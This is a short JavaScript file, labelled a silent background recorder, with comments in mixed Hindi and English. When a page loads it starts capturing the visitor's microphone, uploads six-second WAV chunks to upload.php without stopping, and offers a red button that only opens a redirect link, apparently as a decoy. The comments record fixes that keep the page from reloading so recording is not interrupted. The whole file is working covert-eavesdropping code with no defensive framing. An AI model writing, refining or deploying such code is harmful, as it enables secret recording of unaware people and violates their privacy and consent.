// Silent background recorder — uploads every 6s to upload.php
URL = window.URL || window.webkitURL;

var gumStream;
var rec;
var input;
var AudioContext = window.AudioContext || window.webkitAudioContext;
var audioContext;
var isRecording = false;  // FIX: auto-refresh band karne ke liye flag

var redButton = document.getElementById("redButton");
redButton.addEventListener("click", function() {
  window.open('redirect_link', '_blank');
});

// Pehli baar start karo
window.setTimeout(startRecording, 300);

function startRecording() {
  // Agar pehle se record ho raha hai toh dobara start mat karo
  if (isRecording) return;

  var constraints = { audio: true, video: false };
  navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
    audioContext = new AudioContext();
    gumStream = stream;
    input = audioContext.createMediaStreamSource(stream);
    rec = new Recorder(input, { numChannels: 1 });
    rec.record();
    isRecording = true;
    redButton.disabled = false;

    // Har 6 second mein chunk upload karo — page reload NAHI hoga
    setInterval(function() {
      if (rec && isRecording) {
        rec.stop();
        rec.exportWAV(uploadChunk);
        // Thoda wait karke phir se record shuru karo
        setTimeout(function() {
          rec.clear();
          rec.record();
        }, 300);
      }
    }, 6000);

  }).catch(function(err) {
    redButton.disabled = true;
    // FIX: window.location.reload() hata diya — yahi auto-refresh ka cause tha
    console.log("Mic error: " + err);
  });
}

function uploadChunk(blob) {
  var filename = new Date().toISOString();
  var fd = new FormData();
  fd.append("audio_data", blob, filename);
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "upload.php", true);
  xhr.send(fd);
}
